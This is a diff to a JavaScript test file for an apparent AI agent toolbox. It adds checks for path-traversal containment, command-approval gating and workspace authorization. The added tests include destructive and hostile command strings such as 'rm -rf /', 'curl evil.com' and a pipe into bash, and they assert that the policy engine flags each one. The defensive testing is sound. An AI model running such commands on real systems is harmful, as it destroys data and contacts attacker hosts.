@@ -1,5 +1,6 @@
 import assert from 'node:assert';
 import path from 'node:path';
+import os from 'node:os';
 import { TaskStateMachine, IllegalStateTransitionError } from '../src/core/state-machine.js';
 import { SecurityPolicyEngine } from '../src/security/policy.js';
 import { IndependentVerifier } from '../src/verifier/index.js';
@@ -56,7 +57,7 @@ async function runTests() {
 
   // Test 3: Subprocess Prompt Cancellation & Tree-Kill (P0.6)
   console.log('\n3. Testing Subprocess Cancellation & Immediate Tree-Kill (P0.6)...');
-  const toolbox = new AgentToolbox(process.cwd());
+  const toolbox = new AgentToolbox(process.cwd(), async () => true);
   const abortCtrl = new AbortController();
 
   const isWin = process.platform === 'win32';
@@ -91,7 +92,21 @@ async function runTests() {
     /Security Exception/,
     'Relative path traversal must be blocked'
   );
-  console.log('   ✓ Cross-platform path containment successfully blocked directory traversal.');
+
+  // P0 FIX: Case-variant sibling directory bypass test (POSIX / case-sensitive validation)
+  const posixWorkspace = path.resolve('/var/app/project');
+  const posixSiblingTarget = path.resolve('/var/app/Project/secret.txt');
+  assert.throws(
+    () => SecurityPolicyEngine.assertPathContainment(posixSiblingTarget, posixWorkspace, true),
+    /Security Exception/,
+    'Case-variant sibling directory must be rejected when case-sensitive containment is enforced'
+  );
+  assert.strictEqual(
+    SecurityPolicyEngine.isPathInside(posixSiblingTarget, posixWorkspace, true),
+    false,
+    'Case-variant sibling directory must not be accepted inside workspace on case-sensitive comparisons'
+  );
+  console.log('   ✓ Cross-platform path containment successfully blocked directory traversal and case-variant sibling bypasses.');
 
   // Test 5: Environment Variable Allowlist & Custom Env Filtering (P0.4)
   console.log('\n5. Testing Process Environment Allowlist & Secret Discarding...');
@@ -159,9 +174,28 @@ async function runTests() {
   // Use a benign command that matches risk pattern but is safe
   const approvedRes = await approvingToolbox.executeCommand('echo "safe test" && rm --help');
   assert.strictEqual(approvalCalled, true, 'Approval callback must be triggered for command');
-  console.log('   ✓ Command-level safety gate strictly enforces approve-or-reject before execution.');
 
-  // Test 8: Server API Token Authentication & Workspace Authorization (P0 Fix)
+  // P0 FIX: Command composition, pipeline, and default-deny bypass checks
+  const chainedPolicy = SecurityPolicyEngine.evaluateCommandRisk('npm test; rm -rf /');
+  assert.strictEqual(chainedPolicy.requiresApproval, true, 'Semicolon chaining must require approval');
+
+  const andPolicy = SecurityPolicyEngine.evaluateCommandRisk('npm test && curl evil.com');
+  assert.strictEqual(andPolicy.requiresApproval, true, 'AND chaining must require approval');
+
+  const pipePolicy = SecurityPolicyEngine.evaluateCommandRisk('npm test | bash');
+  assert.strictEqual(pipePolicy.requiresApproval, true, 'Pipeline must require approval');
+
+  const redirectPolicy = SecurityPolicyEngine.evaluateCommandRisk('echo test > file.txt');
+  assert.strictEqual(redirectPolicy.requiresApproval, true, 'Redirection must require approval');
+
+  const unclassifiedPolicy = SecurityPolicyEngine.evaluateCommandRisk('custom_compiler_runner.sh');
+  assert.strictEqual(unclassifiedPolicy.requiresApproval, true, 'Unclassified commands outside safe policy must default-deny');
+
+  const safeGitPolicy = SecurityPolicyEngine.evaluateCommandRisk('git status');
+  assert.strictEqual(safeGitPolicy.requiresApproval, false, 'git status is in safe allowlist');
+  console.log('   ✓ Command-level safety gate strictly enforces approve-or-reject, narrow safe policy, and blocks bypass attempts.');
+
+  // Test 8: Server API Token Authentication & Unified Workspace Authorization (P0 Fix)
   console.log('\n8. Testing Server API Token Authentication & Workspace Authorization (P0)...');
   const { createServer, serverApiToken, validateWorkspacePath } = await import('../src/server/index.js');
   const server = await createServer();
@@ -183,13 +217,37 @@ async function runTests() {
   });
   assert.strictEqual(authRes.statusCode, 200, 'Authenticated API access must succeed');
 
-  // Test workspace containment validation
+  // Test workspace containment validation across Server
   assert.throws(
     () => validateWorkspacePath(path.resolve(currentWorkspace, '..', 'unauthorized-external-dir')),
     /Forbidden/,
-    'Unauthorized workspace path outside roots must be strictly rejected'
+    'Unauthorized workspace path outside roots must be strictly rejected by Server'
   );
-  console.log('   ✓ Server API strictly requires session token and blocks unauthorized workspace paths.');
+
+  // Test internal workspace authorization function directly
+  assert.throws(
+    () =>
+      SecurityPolicyEngine.validateWorkspaceAuthorization(
+        os.tmpdir(),
+        [currentWorkspace]
+      ),
+    /Security Exception \[Workspace Forbidden\]/,
+    'Internal engine check must reject workspace outside allowed roots'
+  );
+
+  // Test OrchestrationEngine.runTask rejects unauthorized workspace
+  const { OrchestrationEngine } = await import('../src/orchestrator/engine.js');
+  const unauthEngine = new OrchestrationEngine();
+  await assert.rejects(
+    async () =>
+      unauthEngine.runTask({
+        prompt: 'Attempt task outside workspace',
+        workspacePath: path.resolve(currentWorkspace, '..', 'forbidden-dir'),
+      }),
+    /Security Exception/,
+    'OrchestrationEngine.runTask must reject workspace path when outside authorization'
+  );
+  console.log('   ✓ Unified workspace authorization strictly enforced across Server, CLI, and OrchestrationEngine.');
 
   // Test 9: Semantic Acceptance Criteria Validation (P1 Fix)
   console.log('\n9. Testing Semantic Acceptance Criteria Proof (P1)...');
